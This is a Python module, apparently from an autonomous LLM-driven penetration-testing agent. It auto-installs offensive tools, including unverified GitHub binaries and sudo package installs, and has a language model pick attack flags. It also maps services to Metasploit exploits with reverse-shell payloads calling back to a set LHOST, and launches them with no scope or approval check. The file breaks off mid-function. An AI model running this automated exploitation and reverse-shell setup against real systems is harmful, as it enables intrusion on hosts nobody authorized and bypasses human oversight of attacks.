"""
DynamicToolManager — autonomous tool discovery, installation, and execution.

Agents NEVER hardcode tool paths or flags. They call:
  result = tool_manager.use("sqlmap", args=["-u", target])
  result = tool_manager.use_intelligent("gobuster", attack_context)
  tools  = tool_manager.get_tools_for_purpose("enumerate SMB shares")
"""
from __future__ import annotations

import json
import logging
import os
import re
import shlex
import shutil
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

from rich.console import Console
from rich.table import Table

_log = logging.getLogger(__name__)
console = Console(stderr=True)

BASE = Path(__file__).parent.parent.parent
TOOLS_DIR = BASE / "tools"
CONFIG_DIR = BASE / "config"
DISCOVERY_CACHE = CONFIG_DIR / "tools_discovered.json"
VENV_BIN = BASE / ".venv" / "bin"

# ── Install alias tables ─────────────────────────────────────────────────────

APT_ALIASES: dict[str, Optional[str]] = {
    "rustscan": "rustscan",
    "feroxbuster": "feroxbuster",
    "httpx": "httpx-toolkit",
    "dnsx": "dnsx",
    "katana": None,
    "ghauri": None,
    "ligolo-ng": None,
    "chisel": "chisel",
    "pwncat": None,
    "evil-winrm": None,
    "kerbrute": None,
    "bloodhound": "bloodhound",
    "crackmapexec": "crackmapexec",
    "nxc": None,
    "impacket": None,
    "havoc": None,
    "netexec": None,
}

GO_INSTALL_MAP: dict[str, Optional[str]] = {
    "httpx": "github.com/projectdiscovery/httpx/cmd/httpx@latest",
    "dnsx": "github.com/projectdiscovery/dnsx/cmd/dnsx@latest",
    "katana": "github.com/projectdiscovery/katana/cmd/katana@latest",
    "nuclei": "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
    "naabu": "github.com/projectdiscovery/naabu/cmd/naabu@latest",
    "subfinder": "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
    "kerbrute": "github.com/ropnop/kerbrute@latest",
    "gobuster": "github.com/OJ/gobuster/v3@latest",
    "amass": "github.com/owasp-amass/amass/v4/...@master",
}

PIP_INSTALL_MAP: dict[str, str] = {
    "ghauri": "git+https://github.com/r0oth3x49/ghauri.git",
    "pwncat": "pwncat-cs",
    "netexec": "netexec",
    "nxc": "netexec",
    "impacket": "impacket",
    "crackmapexec": "crackmapexec",
}

GEM_INSTALL_MAP: dict[str, str] = {
    "wpscan": "wpscan",
    "evil-winrm": "evil-winrm",
}

GITHUB_RELEASE_MAP: dict[str, str] = {
    "rustscan": "RustScan/RustScan",
    "ligolo-ng": "nicocha30/ligolo-ng",
    "chisel": "jpillora/chisel",
    "kerbrute": "ropnop/kerbrute",
    "pspy": "DominicBreuker/pspy",
    "linpeas": "peass-ng/PEASS-ng",
}

GIT_CLONE_MAP: dict[str, str] = {
    "ghauri": "https://github.com/r0oth3x49/ghauri",
    "AutoRecon": "https://github.com/Tib3rius/AutoRecon",
    "LinEnum": "https://github.com/rebootuser/LinEnum",
    "PEASS-ng": "https://github.com/peass-ng/PEASS-ng",
    "BeEF": "https://github.com/beefproject/beef",
}


def _run(cmd: list[str], timeout: int = 60, env: dict | None = None) -> tuple[int, str, str]:
    """Run a command and return (returncode, stdout, stderr)."""
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, env={**os.environ, **(env or {})},
        )
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", f"Timeout after {timeout}s"
    except Exception as e:
        return -1, "", str(e)


def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


def _is_executable(path: str) -> bool:
    """
    Return True only if current user can traverse to and execute path.
    """
    try:
        os.stat(path)
        return os.access(path, os.X_OK)
    except (PermissionError, OSError):
        return False


class DynamicToolManager:
    """
    Autonomous tool discovery, installation and execution manager.
    Drop-in replacement for ToolExecutor — but fully dynamic.
    """

    # ══════════════════════════════════════════════════════════════════════════
    # FIX 6: TOOL-SPECIFIC TIMEOUTS
    # Long-running tools get longer timeouts; short tools get shorter timeouts
    # ══════════════════════════════════════════════════════════════════════════
    TOOL_TIMEOUTS = {
        # Long-running exploitation tools (180s)
        "msfconsole": 180,
        "msfvenom": 120,
        "metasploit": 180,
        # Network scanning (180s for thorough scans)
        "nmap": 180,
        "masscan": 120,
        "nuclei": 180,
        # Brute-forcing (90s with manual fallback)
        "hydra": 90,
        "medusa": 90,
        "crackmapexec": 90,
        "cme": 90,
        # Quick lookups (30s)
        "searchsploit": 30,
        "whatweb": 30,
        "curl": 30,
        "wget": 30,
        # Web scanning (120s)
        "nikto": 120,
        "gobuster": 120,
        "dirb": 120,
        "ffuf": 120,
        "wfuzz": 120,
        # SMB/shares (60s)
        "smbclient": 60,
        "enum4linux": 60,
        "enum4linux-ng": 60,
        # Default
        "_default": 300,
    }

    def __init__(self):
        self.discovered: dict[str, str] = {}       # {name: abs_path}
        self.installed_this_session: list[dict] = []
        self.failed: list[str] = []
        self._usage_log: dict[str, int] = {}       # {name: call_count}

        self.search_paths: list[Path] = [
            Path("/usr/bin"),
            Path("/usr/sbin"),
            Path("/usr/local/bin"),
            Path("/usr/local/sbin"),
            Path("/usr/share"),
            Path.home() / ".local" / "bin",
            Path("/snap/bin"),
            Path("/opt"),
            Path.home() / ".go" / "bin",
            Path.home() / "go" / "bin",
            Path("/root/go/bin"),
            Path.home() / ".cargo" / "bin",
            VENV_BIN,
            TOOLS_DIR,
        ]

        TOOLS_DIR.mkdir(parents=True, exist_ok=True)
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)

        # Load cached discovery if recent (< 1 hour old)
        if self._load_cache():
            console.print(
                f"[dim][[ToolManager]][/] Loaded cache: {len(self.discovered)} tools "
                f"(from {DISCOVERY_CACHE.name})"
            )
        else:
            self.discover_all()

    # ── Cache ────────────────────────────────────────────────────────────────

    def _load_cache(self) -> bool:
        if not DISCOVERY_CACHE.exists():
            return False
        try:
            data = json.loads(DISCOVERY_CACHE.read_text())
            age = time.time() - data.get("_scan_epoch", 0)
            if age > 3600:
                return False
            self.discovered = {n: t["path"] for n, t in data.get("tools", {}).items()
                               if Path(t["path"]).exists()}
            return bool(self.discovered)
        except Exception:
            return False

    def _save_cache(self):
        data = {
            "last_scan": _ts(),
            "_scan_epoch": time.time(),
            "total": len(self.discovered),
            "tools": {
                name: {"path": path, "source": self._infer_source(path)}
                for name, path in self.discovered.items()
            },
        }
        DISCOVERY_CACHE.write_text(json.dumps(data, indent=2))

    def _infer_source(self, path: str) -> str:
        p = path.lower()
        if "gem" in p or "ruby" in p:
            return "gem"
        if str(VENV_BIN) in path or ".venv" in p:
            return "pip"
        if "go/bin" in p or ".go/bin" in p:
            return "go"
        if ".cargo" in p:
            return "cargo"
        if str(TOOLS_DIR) in path:
            return "github"
        return "system"

    # ── Discovery ────────────────────────────────────────────────────────────

    def discover_all(self) -> dict[str, str]:
        """Scan all paths and package managers for executable tools."""
        console.print("[bold cyan][[ToolManager]][/] Scanning system for tools...")
        found: dict[str, str] = {}

        # 1. Filesystem scan
        for base in self.search_paths:
            try:
                if not base.exists():
                    continue
                for entry in base.iterdir():
                    if entry.is_file() and _is_executable(str(entry)):
                        found[entry.name] = str(entry)
            except (PermissionError, OSError):
                pass

        # 2. dpkg installed packages → map package → binary heuristic
        rc, out, _ = _run(["dpkg", "-l"], timeout=15)
        if rc == 0:
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 2 and parts[0] == "ii":
                    pkg = parts[1].split(":")[0]
                    candidate = shutil.which(pkg)
                    if candidate:
                        found[pkg] = candidate

        # 3. gem list
        rc, out, _ = _run(["gem", "list", "--local"], timeout=15)
        if rc == 0:
            for line in out.splitlines():
                gem_name = line.split("(")[0].strip()
                if not gem_name:
                    continue
                p = shutil.which(gem_name)
                if p:
                    found[gem_name] = p

        # 4. pip list in venv
        venv_pip = VENV_BIN / "pip"
        if venv_pip.exists():
            rc, out, _ = _run([str(venv_pip), "list", "--format=columns"], timeout=15)
            if rc == 0:
                for line in out.splitlines()[2:]:  # skip header
                    pkg = line.split()[0] if line.split() else ""
                    if not pkg:
                        continue
                    # check venv bin
                    p = VENV_BIN / pkg
                    if _is_executable(str(p)):
                        found[pkg] = str(p)
                    elif shutil.which(pkg):
                        found[pkg] = shutil.which(pkg)

        # 5. go env GOPATH → scan bin/
        rc, out, _ = _run(["go", "env", "GOPATH"], timeout=10)
        if rc == 0:
            gopath = Path(out.strip()) / "bin"
            if gopath.exists():
                for entry in gopath.iterdir():
                    if entry.is_file() and _is_executable(str(entry)):
                        found[entry.name] = str(entry)

        # 6. Extra find in common user dirs
        for extra in [Path.home() / ".local" / "bin", Path("/snap/bin"),
                      Path.home() / "go" / "bin"]:
            if extra.exists():
                for entry in extra.iterdir():
                    if entry.is_file() and _is_executable(str(entry)):
                        found.setdefault(entry.name, str(entry))

        self.discovered = found
        self._save_cache()
        console.print(
            f"[bold green][[ToolManager]][/] Discovered [bold]{len(self.discovered)}[/] tools on startup"
        )
        return self.discovered

    # ── Find ─────────────────────────────────────────────────────────────────

    def find(self, tool_name: str) -> Optional[str]:
        """Locate a tool binary: cache → which → manual path scan."""
        # 1. Cache
        if tool_name in self.discovered:
            p = self.discovered[tool_name]
            try:
                os.stat(p)
            except (PermissionError, OSError):
                self.discovered.pop(tool_name, None)
            else:
                if _is_executable(p):
                    return p
            self.discovered.pop(tool_name, None)

        # 2. which (subprocess — catches shell aliases and /usr/local)
        rc, out, _ = _run(["which", tool_name], timeout=5)
        if rc == 0 and out.strip():
            path = out.strip()
            if _is_executable(path):
                self.discovered[tool_name] = path
                return path

        # 3. shutil.which
        p = shutil.which(tool_name)
        if p and _is_executable(p):
            self.discovered[tool_name] = p
            return p

        # 4. Manual scan of search paths
        for base in self.search_paths:
            candidate = base / tool_name
            if _is_executable(str(candidate)):
                self.discovered[tool_name] = str(candidate)
                return str(candidate)

        return None

    # ── Core use() ───────────────────────────────────────────────────────────

    def use(self, tool_name: str, args: list,
            purpose: str = "", timeout: int = None,
            output_file: Optional[str] = None) -> dict:
        """
        Find (or auto-install) a tool and run it.
        Returns structured result dict — never raises.
        
        FIX 6: Uses tool-specific timeouts from TOOL_TIMEOUTS dict.
        If timeout is not provided, looks up tool-specific default.
        """
        self._usage_log[tool_name] = self._usage_log.get(tool_name, 0) + 1

        # FIX 6: Use tool-specific timeout if not explicitly provided
        if timeout is None:
            timeout = self.TOOL_TIMEOUTS.get(tool_name, self.TOOL_TIMEOUTS["_default"])

        path = self.find(tool_name)
        if not path:
            console.print(
                f"[yellow][[ToolManager]][/] '{tool_name}' not found — attempting auto-install..."
            )
            path = self.auto_install(tool_name)

        if not path:
            return {
                "success": False,
                "tool": tool_name,
                "command": "",
                "stdout": "",
                "stderr": "",
                "returncode": -1,
                "duration": 0.0,
                "purpose": purpose,
                "error": f"Could not find or install '{tool_name}'",
            }

        cmd = [path] + [str(a) for a in args]
        cmd_str = " ".join(shlex.quote(c) for c in cmd)
        console.print(f"[dim][[ToolManager]] ▶ {cmd_str[:120]} (timeout={timeout}s)[/]")

        t0 = time.time()
        proc = None
        try:
            # FIX 6: Use Popen for better timeout handling and process kill
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                text=True, env=os.environ.copy(),
            )
            stdout, stderr = proc.communicate(timeout=timeout)
            duration = time.time() - t0
            result = {
                "success": proc.returncode == 0,
                "tool": tool_name,
                "command": cmd_str,
                "stdout": stdout,
                "stderr": stderr,
                "returncode": proc.returncode,
                "duration": round(duration, 2),
                "purpose": purpose,
            }
        except subprocess.TimeoutExpired:
            # FIX 6: Kill the process on timeout
            if proc:
                console.print(f"[red][[ToolManager]] ✗ Timeout ({timeout}s) - killing {tool_name} (pid={proc.pid})[/]")
                proc.kill()
                try:
                    proc.wait(timeout=5)  # Wait for process to die
                except:
                    pass
            result = {
                "success": False, "tool": tool_name, "command": cmd_str,
                "stdout": "", "stderr": "", "returncode": -1,
                "duration": round(time.time() - t0, 2), "purpose": purpose,
                "error": f"Timeout after {timeout}s (process killed)",
            }
        except Exception as e:
            if proc:
                try:
                    proc.kill()
                except:
                    pass
            result = {
                "success": False, "tool": tool_name, "command": cmd_str,
                "stdout": "", "stderr": "", "returncode": -1,
                "duration": round(time.time() - t0, 2), "purpose": purpose,
                "error": str(e),
            }

        if output_file:
            try:
                Path(output_file).write_text(result["stdout"])
            except Exception as e:
                _log.warning(f"Could not write output file {output_file}: {e}")

        status = "[green]✓[/]" if result["success"] else "[red]✗[/]"
        console.print(
            f"[dim][[ToolManager]][/] {status} {tool_name} "
            f"[dim](rc={result['returncode']}, {result['duration']}s)[/]"
        )
        return result

    # ── Auto-install ─────────────────────────────────────────────────────────

    def auto_install(self, tool_name: str) -> Optional[str]:
        """
        Try installation in order: apt → pip → gem → go → github release → git clone.
        Returns installed binary path or None.
        """
        console.print(f"[cyan][[ToolManager]][/] Auto-installing: [bold]{tool_name}[/]")

        # 1. APT
        path = self._try_apt(tool_name)
        if path:
            return self._record_install(tool_name, path, "apt")

        # 2. PIP
        path = self._try_pip(tool_name)
        if path:
            return self._record_install(tool_name, path, "pip")

        # 3. GEM
        path = self._try_gem(tool_name)
        if path:
            return self._record_install(tool_name, path, "gem")

        # 4. GO install
        path = self._try_go(tool_name)
        if path:
            return self._record_install(tool_name, path, "go")

        # 5. GitHub release download
        path = self._try_github_release(tool_name)
        if path:
            return self._record_install(tool_name, path, "github-release")

        # 6. Git clone + build
        path = self._try_git_clone(tool_name)
        if path:
            return self._record_install(tool_name, path, "git-clone")

        console.print(f"[red][[ToolManager]][/] ❌ Could not install '{tool_name}' — all methods failed")
        self.failed.append(tool_name)
        return None

    def _record_install(self, name: str, path: str, method: str) -> str:
        console.print(f"[green][[ToolManager]][/] ✅ Auto-installed [bold]{name}[/] via [cyan]{method}[/] → {path}")
        self.discovered[name] = path
        self.installed_this_session.append({"tool": name, "path": path, "method": method, "at": _ts()})
        self._save_cache()
        return path

    def _try_apt(self, tool_name: str) -> Optional[str]:
        pkg = APT_ALIASES.get(tool_name, tool_name)  # use alias, fallback to name
        if pkg is None:
            return None
        rc, _, _ = _run(["sudo", "apt-get", "install", "-y", "--no-install-recommends", pkg], timeout=120)
        if rc == 0:
            return self.find(tool_name)
        # try exact tool_name if alias differed
        if pkg != tool_name:
            rc, _, _ = _run(["sudo", "apt-get", "install", "-y", "--no-install-recommends", tool_name], timeout=120)
            if rc == 0:
                return self.find(tool_name)
        return None

    def _try_pip(self, tool_name: str) -> Optional[str]:
        pkg = PIP_INSTALL_MAP.get(tool_name, tool_name)
        pip_bin = VENV_BIN / "pip"
        if not pip_bin.exists():
            pip_bin = shutil.which("pip3") or shutil.which("pip")
        if not pip_bin:
            return None
        rc, _, _ = _run([str(pip_bin), "install", pkg, "--quiet"], timeout=120)
        if rc == 0:
            # check venv bin first
            p = VENV_BIN / tool_name
            if _is_executable(str(p)):
                return str(p)
            return self.find(tool_name)
        return None

    def _try_gem(self, tool_name: str) -> Optional[str]:
        gem_pkg = GEM_INSTALL_MAP.get(tool_name)
        if not gem_pkg:
            return None
        gem_bin = shutil.which("gem")
        if not gem_bin:
            return None
        rc, _, _ = _run(["sudo", gem_bin, "install", gem_pkg], timeout=180)
        if rc == 0:
            return self.find(tool_name)
        return None

    def _try_go(self, tool_name: str) -> Optional[str]:
        go_pkg = GO_INSTALL_MAP.get(tool_name)
        if not go_pkg:
            return None
        go_bin = shutil.which("go")
        if not go_bin:
            return None
        env = os.environ.copy()
        gopath = env.get("GOPATH", str(Path.home() / "go"))
        env["GOPATH"] = gopath
        rc, _, _ = _run([go_bin, "install", go_pkg], timeout=300, env=env)
        if rc == 0:
            # check $GOPATH/bin
            p = Path(gopath) / "bin" / tool_name
            if p.exists():
                return str(p)
            return self.find(tool_name)
        return None

    def _try_github_release(self, tool_name: str) -> Optional[str]:
        repo = GITHUB_RELEASE_MAP.get(tool_name)
        if not repo:
            return None
        try:
            import urllib.request, urllib.error
            api_url = f"https://api.github.com/repos/{repo}/releases/latest"
            req = urllib.request.Request(api_url, headers={"User-Agent": "CyberAgent/1.0"})
            with urllib.request.urlopen(req, timeout=15) as resp:
                release = json.loads(resp.read())

            assets = release.get("assets", [])
            # prefer linux_amd64 or x86_64 binary
            patterns = ["linux_amd64", "linux-amd64", "x86_64-linux", "linux_x86_64",
                        "amd64_linux", "amd64"]
            chosen = None
            for pat in patterns:
                for asset in assets:
                    name = asset["name"].lower()
                    if pat in name and not name.endswith(".sha256") and not name.endswith(".sig"):
                        chosen = asset
                        break
                if chosen:
                    break

            if not chosen and assets:
                chosen = assets[0]  # fallback: first asset

            if not chosen:
                return None

            dest = TOOLS_DIR / tool_name
            dl_url = chosen["browser_download_url"]
            console.print(f"[dim][[ToolManager]] Downloading {chosen['name']} from GitHub...[/]")

            req2 = urllib.request.Request(dl_url, headers={"User-Agent": "CyberAgent/1.0"})
            with urllib.request.urlopen(req2, timeout=60) as resp:
                raw = resp.read()

            # Handle tarballs / zips
            fname = chosen["name"].lower()
            if fname.endswith(".tar.gz") or fname.endswith(".tgz"):
                import tarfile, io
                with tarfile.open(fileobj=io.BytesIO(raw), mode="r:gz") as tf:
                    for member in tf.getmembers():
                        if member.isfile() and (
                            member.name.endswith(tool_name) or
                            os.path.basename(member.name) == tool_name
                        ):
                            f = tf.extractfile(member)
                            if f:
                                dest.write_bytes(f.read())
                                break
            elif fname.endswith(".zip"):
                import zipfile, io
                with zipfile.ZipFile(io.BytesIO(raw)) as zf:
                    for zname in zf.namelist():
                        if zname.endswith(tool_name) or os.path.basename(zname) == tool_name:
                            dest.write_bytes(zf.read(zname))
                            break
            else:
                # assume raw binary
                dest.write_bytes(raw)

            if dest.exists() and dest.stat().st_size > 0:
                dest.chmod(0o755)
                return str(dest)
        except Exception as e:
            _log.warning(f"GitHub release download for {tool_name} failed: {e}")
        return None

    def _try_git_clone(self, tool_name: str) -> Optional[str]:
        repo_url = GIT_CLONE_MAP.get(tool_name)
        if not repo_url:
            return None
        clone_dir = TOOLS_DIR / tool_name
        if not clone_dir.exists():
            rc, _, _ = _run(["git", "clone", "--depth=1", repo_url, str(clone_dir)], timeout=120)
            if rc != 0:
                return None

        # Auto-detect build system
        if (clone_dir / "setup.py").exists() or (clone_dir / "pyproject.toml").exists():
            pip_bin = str(VENV_BIN / "pip")
            _run([pip_bin, "install", "-e", str(clone_dir), "--quiet"], timeout=120)
        elif (clone_dir / "requirements.txt").exists():
            pip_bin = str(VENV_BIN / "pip")
            _run([pip_bin, "install", "-r", str(clone_dir / "requirements.txt"), "--quiet"], timeout=120)
        elif (clone_dir / "go.mod").exists():
            go_bin = shutil.which("go") or "go"
            out_bin = TOOLS_DIR / tool_name / tool_name
            _run([go_bin, "build", "-o", str(out_bin), "./..."],
                 timeout=300, env={**os.environ, "GOPATH": str(Path.home() / "go")})
            if out_bin.exists():
                out_bin.chmod(0o755)
                return str(out_bin)
        elif (clone_dir / "Cargo.toml").exists():
            cargo_bin = shutil.which("cargo") or "cargo"
            _run([cargo_bin, "build", "--release"], timeout=600)
            p = clone_dir / "target" / "release" / tool_name
            if p.exists():
                p.chmod(0o755)
                return str(p)
        elif (clone_dir / "Makefile").exists():
            _run(["make", "-C", str(clone_dir), "install"], timeout=300)

        return self.find(tool_name)

    # ── Intelligent methods ──────────────────────────────────────────────────

    def configure_for_attack(self, tool_name: str, attack_context: dict) -> list[str]:
        """
        LLM-powered flag generation.
        Reads --help, queries RAG, asks reasoning model for optimal args.
        Returns a list of CLI argument strings.
        """
        try:
            # 1. Get tool help text (first 100 lines)
            path = self.find(tool_name)
            help_text = ""
            if path:
                _, h1, h2 = _run([path, "--help"], timeout=10)
                help_raw = (h1 or h2)[:4000]
                help_text = "\n".join(help_raw.splitlines()[:100])

            # 2. RAG examples
            rag_text = ""
            try:
                import sys
                sys.path.insert(0, str(BASE / "src"))
                from memory.chroma_manager import ChromaManager
                chroma = ChromaManager()
                results = chroma.get_rag_context(
                    f"{tool_name} {attack_context.get('purpose', '')} flags usage example",
                    n=4,
                )
                rag_text = "\n".join(r["text"][:400] for r in results[:3])
            except Exception as e:
                _log.debug(f"RAG lookup failed in configure_for_attack: {e}")

            # 3. Ask LLM
            import sys
            sys.path.insert(0, str(BASE / "src"))
            from utils.llm_factory import get_llm
            llm = get_llm("reasoning")

            prompt = f"""You are an expert penetration tester. Given the tool help output and attack context below,
generate the OPTIMAL command-line arguments for this tool.

Tool: {tool_name}
Tool help (truncated):
{help_text or "(help not available)"}

RAG examples from knowledge base:
{rag_text or "(no examples found)"}

Attack context:
{json.dumps(attack_context, indent=2)}

Rules:
- Return ONLY a valid JSON array of strings (the argument list), nothing else
- Do NOT include the tool name itself, only its arguments
- Use real flags that exist in the help output
- Prefer common, reliable options over exotic ones
- Example output: ["-u", "http://target.com", "--batch", "--dbs"]

JSON argument list:"""

            response = llm.invoke(prompt)
            # Extract JSON array from response
            m = re.search(r'\[.*?\]', str(response), re.DOTALL)
            if m:
                args = json.loads(m.group(0))
                if isinstance(args, list):
                    console.print(
                        f"[green][[ToolManager]][/] LLM configured [bold]{tool_name}[/]: "
                        f"{' '.join(str(a) for a in args)[:120]}"
                    )
                    return [str(a) for a in args]
        except Exception as e:
            _log.warning(f"configure_for_attack({tool_name}) LLM call failed: {e}")

        # Fallback: return minimal safe defaults
        console.print(f"[yellow][[ToolManager]][/] LLM config failed for {tool_name}, using defaults")
        return self._default_args(tool_name, attack_context)

    def _default_args(self, tool_name: str, ctx: dict) -> list[str]:
        """Safe fallback defaults when LLM is unavailable."""
        target = ctx.get("target", "")
        service = ctx.get("service", "")
        port = ctx.get("port", 0)
        cve = ctx.get("cve", "")
        lhost = ctx.get("lhost", "192.168.80.1")
        lport = ctx.get("lport", 4444)
        
        defaults: dict[str, list] = {
            "nmap": ["-sV", "-sC", "--top-ports", "1000", target],
            "gobuster": ["dir", "-u", target, "-w",
                         "/usr/share/wordlists/dirb/common.txt", "-q"],
            "ffuf": ["-u", f"{target}/FUZZ", "-w",
                     "/usr/share/wordlists/dirb/common.txt", "-mc", "200,301,302"],
            "nikto": ["-h", target, "-Tuning", "1234"],
            "sqlmap": ["-u", target, "--batch", "--level=2", "--risk=1"],
            "hydra": [target, service or "ssh", "-t", "4"],
            "nuclei": ["-u", target, "-severity", "critical,high"],
            "wpscan": ["--url", target, "--enumerate", "u,vp"],
            "feroxbuster": ["-u", target, "-q"],
            "dnsx": ["-l", "subdomains.txt", "-a"],
            "subfinder": ["-d", target, "-silent"],
        }
        
        # Special handling for Metasploit - LLM-driven module selection
        if tool_name == "msfconsole":
            return self._get_msf_args(target, service, port, cve, lhost, lport)
        
        return defaults.get(tool_name, [target])
    
    def _get_msf_args(
        self, target: str, service: str, port: int, 
        cve: str, lhost: str, lport: int
    ) -> list[str]:
        """
        Generate Metasploit arguments based on service/CVE.
        Uses LLM to select the best module when available.
        
        SECURITY: All user inputs are validated to prevent command injection.
        """
        import shlex
        
        # ══════════════════════════════════════════════════════════════════════
        # INPUT VALIDATION - Prevent command injection
        # ══════════════════════════════════════════════════════════════════════
        def validate_ip_or_host(value: str) -> str:
            """Validate IP address or hostname - no shell metacharacters."""
            if not value:
                raise ValueError("Empty target")
            # Allow only: alphanumeric, dots, hyphens, underscores
            if not re.match(r'^[\w\.\-]+$', value):
                raise ValueError(f"Invalid characters in: {value}")
            return value
        
        def validate_port(value: int) -> int:
            """Validate port number."""
            if not isinstance(value, int) or value < 1 or value > 65535:
                raise ValueError(f"Invalid port: {value}")
            return value
        
        def validate_module(value: str) -> str:
            """Validate Metasploit module path."""
            if not value:
                return value
            # Module paths are like: exploit/unix/ftp/vsftpd_234_backdoor
            if not re.match(r'^[\w/\-]+$', value):
                raise ValueError(f"Invalid module path: {value}")
            return value
        
        # Validate all inputs
        try:
            target = validate_ip_or_host(target)
            port = validate_port(port)
            lhost = validate_ip_or_host(lhost) if lhost else "127.0.0.1"
            lport = validate_port(lport) if lport else 4444
        except ValueError as e:
            _log.error(f"Input validation failed: {e}")
            return ["-q", "-x", "echo 'Invalid input'; exit 1"]
        
        # Module database for common exploits
        MSF_MODULES = {
            # FTP
            ("vsftpd", "2.3.4"): ("exploit/unix/ftp/vsftpd_234_backdoor", "cmd/unix/interact"),
            ("proftpd", "1.3.3c"): ("exploit/unix/ftp/proftpd_133c_backdoor", "cmd/unix/reverse_perl"),
            # SMB/Samba
            ("samba", "3.0"): ("exploit/multi/samba/usermap_script", "cmd/unix/reverse_netcat"),
            ("smb", "ms17"): ("exploit/windows/smb/ms17_010_eternalblue", "windows/meterpreter/reverse_tcp"),
            # HTTP
            ("php", "cgi"): ("exploit/multi/http/php_cgi_arg_injection", "php/reverse_php"),
            ("shellshock", ""): ("exploit/multi/http/apache_mod_cgi_bash_env_exec", "linux/x86/meterpreter/reverse_tcp"),
            ("tomcat", ""): ("exploit/multi/http/tomcat_mgr_upload", "java/meterpreter/reverse_tcp"),
            ("jenkins", ""): ("exploit/multi/http/jenkins_script_console", "linux/x86/meterpreter/reverse_tcp"),
            # Services
            ("distccd", ""): ("exploit/unix/misc/distcc_exec", "cmd/unix/reverse_bash"),
            ("unrealirc", ""): ("exploit/unix/irc/unreal_ircd_3281_backdoor", "cmd/unix/reverse_perl"),
            ("java_rmi", ""): ("exploit/multi/misc/java_rmi_server", "java/meterpreter/reverse_tcp"),
            ("postgres", ""): ("exploit/multi/postgres/postgres_copy_from_program_cmd_exec", "cmd/unix/reverse_bash"),
        }
        
        # Find matching module
        module = None
        payload = "cmd/unix/interact"
        
        search_key = f"{service} {cve}".lower()
        for (svc, ver), (mod, pay) in MSF_MODULES.items():
            if svc in search_key or ver in search_key:
                module = mod
                payload = pay
                break
        
        if not module:
            # Try LLM to find module
            try:
                import sys
                sys.path.insert(0, str(BASE / "src"))
                from utils.llm_factory import get_llm
                llm = get_llm("default")
                
                prompt = f"""What Metasploit module should I use for:
Service: {service}
CVE: {cve}
Port: {port}

Return ONLY the module path (e.g., exploit/unix/ftp/vsftpd_234_backdoor), nothing else."""
                
                response = str(llm.invoke(prompt))
                m = re.search(r'(exploit/[\w/]+)', response)
                if m:
                    module = m.group(1)
            except Exception:
                pass
        
        if not module:
            # Generic fallback
            if "ftp" in service:
                module = "auxiliary/scanner/ftp/ftp_version"
            elif "smb" in service or "samba" in service:
                module = "auxiliary/scanner/smb/smb_version"
            elif "http" in service:
                module = "auxiliary/scanner/http/http_version"
            else:
                module = "auxiliary/scanner/portscan/tcp"
        
        # Validate module path
        try:
            module = validate_module(module)
        except ValueError:
            module = "auxiliary/scanner/portscan/tcp"
        
        # Build msfconsole command - inputs are now validated
        msf_cmd = (
            f"use {module}; "
            f"set RHOSTS {target}; "
        )
        
        if port:
            msf_cmd += f"set RPORT {port}; "
        
        if "exploit/" in module:
            msf_cmd += f"set PAYLOAD {payload}; "
            msf_cmd += f"set LHOST {lhost}; "
            msf_cmd += f"set LPORT {lport}; "
        
        msf_cmd += "run; exit -y"
        
        return ["-q", "-x", msf_cmd]

    def use_intelligent(self, tool_name: str, attack_context: dict,
                        timeout: int = 120) -> dict:
        """
        Primary agent attack method: LLM picks flags, then runs the tool.
        
        Returns:
            dict with keys: stdout, stderr, returncode, command
            On error: {"error": str, "tool": tool_name}

        Usage:
          result = tm.use_intelligent("sqlmap", {
            "target": "http://192.168.1.1/login.php",
            "service": "http",
            "purpose": "detect and exploit SQL injection",
            "known_info": "MySQL backend, login form"
          })
        """
        try:
            args = self.configure_for_attack(tool_name, attack_context)
            if not args:
                return {"error": "configure_for_attack returned empty args", "tool": tool_name}
            
            result = self.use(
                tool_name, args,
                purpose=attack_context.get("purpose", ""),
                timeout=timeout,
            )
            return result
            
        except Exception as e:
            _log.warning(f"use_intelligent({tool_name}) failed: {e}")
            return {"error": f"intelligent_failed: {e}", "tool": tool_name}

    def get_tools_for_purpose(self, purpose: str) -> list[str]:
        """
        LLM-powered tool selection: returns best 3-5 tools for a given purpose.
        Searches discovered tools + RAG for context.
        """
        try:
            # RAG context
            rag_text = ""
            try:
                import sys
                sys.path.insert(0, str(BASE / "src"))
                from memory.chroma_manager import ChromaManager
                chroma = ChromaManager()
                results = chroma.get_rag_context(purpose, collections=["hacktricks"], n=3)
                rag_text = "\n".join(r["text"][:400] for r in results[:2])
            except Exception as e:
                _log.debug(f"RAG lookup failed in get_tools_for_purpose: {e}")

            import sys
            sys.path.insert(0, str(BASE / "src"))
            from utils.llm_factory import get_llm
            llm = get_llm("reasoning")

            # Use a curated pentest-relevant tool list to avoid LLM token overflow
            KNOWN_PENTEST = {
                "nmap","masscan","rustscan","naabu",
                "gobuster","ffuf","dirb","feroxbuster","dirsearch","wfuzz",
                "nikto","nuclei","wpscan","whatweb","wafw00f",
                "sqlmap","ghauri","xsser",
                "hydra","medusa","john","hashcat","crunch",
                "metasploit","msfconsole","msfvenom","searchsploit",
                "enum4linux","enum4linux-ng","smbclient","smbmap","crackmapexec","nxc",
                "rpcclient","ldapsearch","bloodhound","sharphound","kerbrute",
                "impacket-secretsdump","impacket-psexec","impacket-wmiexec",
                "responder","bettercap","ettercap","arp-scan","netdiscover",
                "subfinder","amass","assetfinder","dnsx","dnsenum","dnsrecon","fierce",
                "theharvester","shodan","recon-ng","maltego",
                "burpsuite","zaproxy","mitmproxy","caido",
                "netcat","nc","socat","chisel","ligolo-ng","pwncat",
                "tcpdump","wireshark","tshark",
                "linpeas","winpeas","pspy","linenum","unix-privesc-check",
                "evil-winrm","psexec","sshpass","smbexec",
                "openssl","curl","wget","ssh","ftp","telnet",
                "smtp-user-enum","swaks","snmpwalk","onesixtyone",
                "sipvicious","svmap",
                "aircrack-ng","hashid","hash-identifier",
                "katana","httpx","waybackurls","gau","arjun",
                "gitdumper","trufflehogg","gitleaks",
            }
            available = sorted(n for n in KNOWN_PENTEST if n in self.discovered)
